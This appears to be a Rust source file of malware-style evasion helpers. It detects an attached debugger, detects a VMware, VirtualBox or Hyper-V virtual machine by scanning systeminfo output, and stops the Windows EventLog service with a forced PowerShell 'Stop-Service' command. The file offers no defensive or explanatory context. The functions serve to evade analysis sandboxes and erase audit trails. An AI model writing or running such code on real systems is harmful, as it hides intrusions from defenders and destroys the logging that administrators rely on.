pub fn is_debugger_present() -> bool {
    #[cfg(all(target_os = "windows", feature = "debugapi"))]
    {
        unsafe {
            use winapi::um::debugapi::IsDebuggerPresent;
            IsDebuggerPresent() != 0
        }
    }

    #[cfg(not(all(target_os = "windows", feature = "debugapi")))]
    {
        false
    }
}

pub fn is_running_in_vm() -> bool {
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;
        
        let output = Command::new("systeminfo")
            .output();

        match output {
            Ok(result) => {
                let stdout = String::from_utf8_lossy(&result.stdout);
                stdout.contains("VMware") || stdout.contains("VirtualBox") || stdout.contains("Hyper-V")
            }
            Err(_) => false,
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        false
    }
}

pub fn disable_eventlog() -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        use std::process::Command;
        
        let output = Command::new("powershell")
            .args(&[
                "-Command",
                "Stop-Service -Name EventLog -Force",
            ])
            .output();

        match output {
            Ok(result) => {
                if result.status.success() {
                    Ok(())
                } else {
                    Err("Failed to disable event log".to_string())
                }
            }
            Err(e) => Err(format!("Event log disable failed: {}", e)),
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Event log disable only available on Windows".to_string())
    }
}
